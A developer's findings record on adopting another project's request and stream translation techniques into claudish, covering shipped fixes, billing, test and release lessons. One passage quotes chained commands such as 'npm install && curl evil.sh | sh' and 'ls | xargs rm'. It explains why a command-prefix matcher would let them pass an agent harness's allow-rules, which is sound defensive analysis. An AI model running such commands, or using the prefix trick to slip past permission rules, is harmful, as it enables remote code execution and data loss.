# Adopting free-claude-code's translation techniques — findings

Shipped as **v9.5.0** (16 items) and **v9.6.1** (four defects the live verification found).
Session artifacts lived in a gitignored directory; this is the durable record.

Source: read-only comparison of claudish against
[`Alishahryar1/free-claude-code`](https://github.com/Alishahryar1/free-claude-code) (FCC —
Python, MIT, ~55k stars, clone @ `22d9d19`).

## What FCC does better, and what claudish does better

FCC is stronger on **request-side fidelity and stream-state discipline**: a real tool-history
ledger, a reversible tool-name codec, schema-typed text-tool parsing, chunk-safe `<think>`
parsing, pre-name argument buffering, cache-aware usage, one-open-block-at-a-time emission.

claudish is stronger wherever behaviour was **measured against a real client**: truncation and
refusal reporting, not executing truncated tool JSON, errors riding an HTTP 200, the 400-remap
contract, billing-header stripping, per-model effort clamping from the catalog, the native
Gemini wire — and its fixtures are real captures.

Deliberately **not** adopted:

- FCC's local short-circuit of Claude Code utility calls, and its **command-prefix mocking**.
  `extract_command_prefix` (`fcc/api/command_utils.py:25-77`) returns `npm install` for
  `npm install && curl evil.sh | sh`, `ls` for `ls | xargs rm`, and `cat` for
  `cat x > /etc/passwd`. If a harness matches allow-rules against that prefix, a chained
  command passes as the allowed one.
- FCC's mid-stream continuation and **tool-argument suffix repair**. A schema-valid suffix
  such as `"}` can "complete" a truncated `Write.content`, writing a truncated file silently.

## What shipped

16 of 17 items. Item 15 (Responses reasoning replay) was **deferred**: `buildPayload` runs at
`composed-handler.ts:470` while credentials resolve at `:594`, so the credential fingerprint
cannot exist at that layer, and `conversationKey()` returns a process-wide `randomBytes(16)`
with no session id — so under `serve` a foreign reasoning blob would have **validated**. The
design claimed a silent drop; the real behaviour would have been a silent accept.

Three defects were proven by running code before any fix existed:

1. An empty-string required argument counted as missing, so **every `Edit` that deletes text**
   had its tool call discarded and replaced by a warning block.
2. Tool-argument fragments arriving before `function.name` were dropped, losing the call.
3. A stream cut mid tool-call with no `finish_reason` was reported as a **successful empty turn**.

## Money: why item 6 cannot change a bill today

No pricing source in the tree carries a cache-read rate — `SlimModelEntry` has no pricing
field at all, and `ModelPricing` has exactly `inputCostPer1M` / `outputCostPer1M`. So the
cache discount is written as a **subtraction** whose rate defaults to `inputCostPer1M`, making
the term provably zero until a rate appears.

`min(cacheReadTokens, billedInputTokens)` is load-bearing: `updateWithDelta` charges only
context *growth*, so without the clamp the discount exceeds the charge and `sessionTotalCost`
goes negative — on the real Grok capture, subtracting 20,352 tokens' worth from a 27-token
charge.

`onTokenUpdate`'s first argument stays the **full** `prompt_tokens`. Anthropic's wire semantics
exclude cache reads from `input_tokens`, so passing the reduced value would report a nearly
full conversation as almost empty and silently disarm auto-compaction.

## Lessons that generalise beyond this work

### A green suite proved nothing four times running

Design and code were each reviewed twice (internal + external). **All four rounds returned
FAIL** while `typecheck`, `lint` and 3,400+ tests were green. Every defect they caught was
invisible to the automated gate:

- a tool name the client never advertised (encoder paired with a decoder-less wire)
- a retry path that never ran for unknown models
- one block index given two full lifecycles, double-counting the tool-observation hook
- **two fixes whose tests stayed green when the fix was reverted**

### Stale written records beat fresh reading, twice

The design counted emit sites from a **comment** at `openai-sse.ts:211` rather than the file.
Real counts: 10 starts, 17 stops, 7 tool starts. Separately, the recorded "2 known test
failures" baseline was obsolete — those tests had been gated behind `test.skipIf`.

### `extract-sse-from-log.ts` merged concurrent streams

It assumed one conversation per log. With two overlapping upstream requests it interleaved
them, producing a fixture carrying a foreign `finish_reason: "stop"` that would have made the
item-1 regression test pass **with or without** the fix. Caught by hand; fixed in v9.6.1 by
keying on upstream response id. **Any fixture previously mined from a busy log is suspect.**
Anthropic streams remain inseparable — their deltas carry no id.

### The local test suite spends real money

`packages/cli/src/handlers/default-provider-e2e.test.ts` gated only on credential presence, so
on a machine with credentials it always called real providers — it billed OpenRouter and xAI
during this work's own baseline, and fell through to metered providers when two subscription
plans hit 429. Fixed to honour `CLAUDISH_SKIP_LIVE_E2E`. Consequence worth remembering: a
suite whose failure count tracks quota balance **cannot be a regression baseline**.

### A worktree's first test run is meaningless

`git worktree add` copies tracked files, not `node_modules`. The first baseline reported
17 failures and 14 errors, all environmental (`Cannot find module '@opentui/react/jsx-runtime'`).

### `ssh-add -l` says an agent was empty; it does not say which agent answered

Fifteen commits landed unsigned. `ssh-add -l` reported "The agent has no identities", which
reads as a locked vault. The vault was fine: `SSH_AUTH_SOCK` pointed at
`/var/run/com.apple.launchd.…/Listeners` while the keys live in 1Password's socket under
`~/Library/Group Containers/2BUA8C4S2C.com.1password/t/agent.sock`. **Check
`echo $SSH_AUTH_SOCK` before concluding anything from `ssh-add -l`.**

### `--theirs` during a rebase means the commit being replayed

A concurrent session released v9.6.0 mid-flight, conflicting the version files. `git checkout
--theirs` yielded *our* 9.5.1, not main's 9.6.0 — the opposite of the intuition. The bump had
to be re-targeted to 9.6.1 explicitly; taking either side would have published a version
lower than what was already on npm.

### A green release workflow is not a published package

v9.5.0's workflow went green while the per-version manifest returned 404 —
`Your package is being processed`. v9.6.1's release job then failed three times on
`Headers Timeout Error` uploading the larger binaries, leaving an incomplete **draft** and
blocking `publish-npm` (which declares `needs: release`). The tell that it was upstream
flakiness and not a defect: individual `✅ Uploaded` lines succeeded while others returned
GitHub's HTML error page, and the eventual successful run took **25 seconds** against a
7m36s timeout. **Verify the per-version manifest, never `npm view`.**

## Live verification: what a mock upstream reaches that providers cannot

Round 1 verified 10 of 16 items against the published artifact and left 6 unreachable, because
Claude Code never sends those shapes. Two instruments closed the gap:

1. **`claudish serve` + `curl`** — construct request shapes the client never produces. This is
   how `tool_choice:{"type":"any"}`, a 65-char tool name, `source.type:"url"` images, adjacent
   user messages and reversed tool results were all proven.
2. **A mock OpenAI-compatible upstream** — replay streams no provider produces on demand, and
   **record the exact outbound body**. That recording settled a question inference could not:
   claudish emits `stop: ['ZZZ']` and `top_p: 0.5`, so the Grok subscription proxy is what
   ignores `stop` (or rejects it, with `GrokModelDialect.recoverFromRejection` stripping and
   retrying — indistinguishable from the client).

### Which providers emit which shapes — measured, not assumed

- **No `<think>` tags are reachable locally.** Ollama normalizes them into a separate field on
  *both* endpoints: `reasoning` on `/v1/chat/completions`, `thinking` on `/api/chat`. Both
  `lfm2.5:8b` and `qwen3.5:0.8b-mlx` return `content: ""` with reasoning split out. No `.sse`
  capture in this repo contains a raw tag.
- **Two real models refuse to overflow.** `ollama@lfm2.5:8b` accepted a 2.7 MB payload and
  answered normally; `kimi-k2.6` (stated 262K context) accepted **400,093 input tokens**.
- **`gk@grok-4.6` is an OpenAI-shaped wire** despite `transport: "grok-subscription"` — the
  transport subclasses `OpenAIProviderTransport`. A first, wrong explanation of the
  stop_sequences result relied on it not being one.

## The v9.6.1 defects

1. **`<tool_call>`-wrapped envelopes silently corrupted tool arguments.**
   `parseFunctionTagEnvelope` required the body to start with `<function=`, so the wrapped form
   Qwen/Hermes models actually emit fell through to the legacy regex, which swallowed the
   closing tags into the value:
   ```
   wrapped    {"city":"Paris</parameter></function></tool_call>"}
   unwrapped  {"city":"Paris"}
   ```
   The parser was correct; its **entry condition** was too narrow.
2. `extract-sse-from-log.ts` stream separation (above).
3. `--models --provider` reported nothing for a **routing prefix** without explaining why, and
   silently ignored the `--provider=<slug>` form. Partly a false alarm on my part: `x-ai`,
   `z-ai` and `moonshotai` all worked; only `moonshot` was empty, and correctly so.
4. Item 9's `array`/`object` coercion and item 12's guard gained tests that fail when reverted.

## Still untested, and why

- **Item 5's end-to-end ordering** (`reasoning_content` after text through `openai-sse.ts`).
  Measured: no capture in the tree has that ordering. Becomes covered free the moment one
  lands — `block-nesting.test.ts` discovers captures by content.
- **Item 6's discounted branch** — unreachable until a pricing source supplies
  `cacheReadCostPer1M`.

Both are honest gaps under the real-captures-only rule, not oversights.
